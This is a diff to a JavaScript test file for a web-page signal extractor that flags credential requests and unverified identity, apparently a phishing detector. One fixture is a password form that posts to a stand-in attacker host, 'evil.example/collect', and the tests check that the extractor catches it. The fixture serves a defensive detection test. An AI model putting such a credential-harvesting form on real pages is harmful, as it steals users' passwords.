@@ -11,9 +11,9 @@ const src = readFileSync(join(here, "..", "extractor.js"), "utf8");
 new Function(src)();
 const extract = globalThis.sovirExtractSignals;
 
-function doc(html, protocol = "https:") {
+function doc(html, protocol = "https:", host = "site.example") {
   const { window } = new JSDOM(`<!doctype html><html><body>${html}</body></html>`);
-  return { doc: window.document, loc: { protocol } };
+  return { doc: window.document, loc: { protocol, host, href: `${protocol}//${host}/` } };
 }
 
 test("benign page produces no signals", () => {
@@ -55,6 +55,25 @@ test("http + signal → IDENTITY_UNVERIFIED added", () => {
 
 test("https does not add IDENTITY_UNVERIFIED", () => {
   const { doc: d, loc } = doc('<input type="password">', "https:");
+  assert.ok(!extract(d, loc).includes("IDENTITY_UNVERIFIED"));
+});
+
+test("password form posting cross-origin → IDENTITY_UNVERIFIED", () => {
+  const { doc: d, loc } = doc(
+    '<form action="https://evil.example/collect"><input type="password"></form>',
+  );
+  const s = extract(d, loc);
+  assert.ok(s.includes("CREDENTIAL_REQUEST"));
+  assert.ok(s.includes("IDENTITY_UNVERIFIED"));
+});
+
+test("password form posting same-origin → no IDENTITY_UNVERIFIED", () => {
+  const { doc: d, loc } = doc('<form action="/login"><input type="password"></form>');
+  assert.ok(!extract(d, loc).includes("IDENTITY_UNVERIFIED"));
+});
+
+test("cross-origin form without password field → no IDENTITY_UNVERIFIED", () => {
+  const { doc: d, loc } = doc('<form action="https://cdn.example/x"><input type="text"></form>');
   assert.ok(!extract(d, loc).includes("IDENTITY_UNVERIFIED"));
 });
 
